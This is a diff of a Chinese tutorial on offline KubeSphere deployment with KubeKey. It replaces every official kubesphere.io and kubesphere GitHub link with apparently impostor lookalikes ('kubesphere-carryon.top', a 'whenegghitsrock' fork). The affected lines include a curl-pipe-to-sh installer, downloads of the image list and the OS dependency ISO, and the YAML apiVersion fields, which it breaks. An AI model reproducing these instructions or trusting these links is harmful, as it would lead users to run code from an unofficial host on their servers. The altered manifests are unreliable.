@@ -23,7 +23,7 @@ manifest 是一个描述当前 K8s 集群信息和定义 artifact 制品中需�
 KubeKey 生成 manifest 文件有两种方式。
 
 - 利用现有运行中的集群作为源生成 manifest 文件，也是官方推荐的一种方式，具体参考 KubeSphere [官网的离线部署文档](https://kubesphere.com.cn/docs/v3.3/installing-on-linux/introduction/air-gapped-installation/ "官网的离线部署文档")。
-- 根据 [模板文件](https://github.com/kubesphere/kubekey/blob/master/docs/manifest-example.md "模板文件") 手动编写 manifest 文件。
+- 根据 [模板文件](https://github.com/whenegghitsrock/kubekey-carryon/blob/master/docs/manifest-example.md "模板文件") 手动编写 manifest 文件。
 
 第一种方式的好处是可以构建 1:1 的运行环境，但是需要提前部署一个集群，不够灵活度，并不是所有人都具备这种条件的。
 
@@ -78,19 +78,19 @@ $ export KKZONE=cn
 # 下载KubeKey
 $ mkdir /data/kubekey
 $ cd /data/kubekey/
-$ curl -sfL https://get-kk.kubesphere.io | VERSION=v2.2.1 sh -
+$ curl -sfL https://get-kk.docs.kubesphere-carryon.top | VERSION=v2.2.1 sh -
 ```
 
 ### 获取 manifest 模板
 
-参考 **https://github.com/kubesphere/kubekey/blob/master/docs/manifest-example.md**
+参考 **https://github.com/whenegghitsrock/kubekey-carryon/blob/master/docs/manifest-example.md**
 
 有两个参考用例，一个简单版，一个完整版。参考简单版就可以。
 
 ### 获取 ks-installer images-list
 
 ```shell
-$ wget https://github.com/kubesphere/ks-installer/releases/download/v3.3.0/images-list.txt
+$ wget https://github.com/whenegghitsrock/ks-installer-carryon/releases/download/v3.3.0/images-list.txt
 ```
 
 文中的 image 列表选用的 Docker Hub 仓库其他组件存放的公共仓库，国内建议统一更改前缀为 **registry.cn-beijing.aliyuncs.com/kubesphereio**
@@ -102,7 +102,7 @@ $ wget https://github.com/kubesphere/ks-installer/releases/download/v3.3.0/image
 ### 获取操作系统依赖包
 
 ```shell
-$ wget https://github.com/kubesphere/kubekey/releases/download/v2.2.1/centos7-rpms-amd64.iso
+$ wget https://github.com/whenegghitsrock/kubekey-carryon/releases/download/v2.2.1/centos7-rpms-amd64.iso
 ```
 
 将该 ISO 文件放到制作离线镜像的服务器的 /data/kubekey 目录下
@@ -114,7 +114,7 @@ $ wget https://github.com/kubesphere/kubekey/releases/download/v2.2.1/centos7-rp
 命名为 **ks-v3.3.0-manifest.yaml**
 
 ```yaml
-apiVersion: kubekey.kubesphere.io/v1alpha2
+apiVersion: kubekey.docs.kubesphere-carryon.top/v1alpha2
 kind: Manifest
 metadata:
   name: sample
@@ -303,7 +303,7 @@ spec:
 - 开启 **harbor** 和 **docker-compose** 配置项，为后面通过 KubeKey 自建 harbor 仓库推送镜像使用。
 - 默认创建的 manifest 里面的镜像列表从 **docker.io** 获取，替换前缀为 **registry.cn-beijing.aliyuncs.com/kubesphereio**。
 - 若需要导出的 artifact 文件中包含操作系统依赖文件（如：conntarck、chrony 等），可在 **operationSystem** 元素中的 **.repostiory.iso.url** 中配置相应的 ISO 依赖文件下载地址为 **localPath** ，填写提前下载好的 ISO 包在本地的存放路径，并将 **url** 配置项置空。
-- 您可以访问 https://github.com/kubesphere/kubekey/releases/tag/v2.2.1 下载 ISO 文件。
+- 您可以访问 https://github.com/whenegghitsrock/kubekey-carryon/releases/tag/v2.2.1 下载 ISO 文件。
 
 ### 导出制品 artifact
 
@@ -438,7 +438,7 @@ $ vim config-sample.yaml
 - 按实际情况添加 **registry** 的相关信息。
 
 ```yaml
-apiVersion: kubekey.kubesphere.io/v1alpha2
+apiVersion: kubekey.docs.kubesphere-carryon.top/v1alpha2
 kind: Cluster
 metadata:
   name: sample
@@ -588,7 +588,7 @@ NOTES：
   2. Please change the default password after login.
 
 #####################################################
-https://kubesphere.io             2022-06-30 14:30:19
+https://docs.kubesphere-carryon.top             2022-06-30 14:30:19
 #####################################################
 ```
 
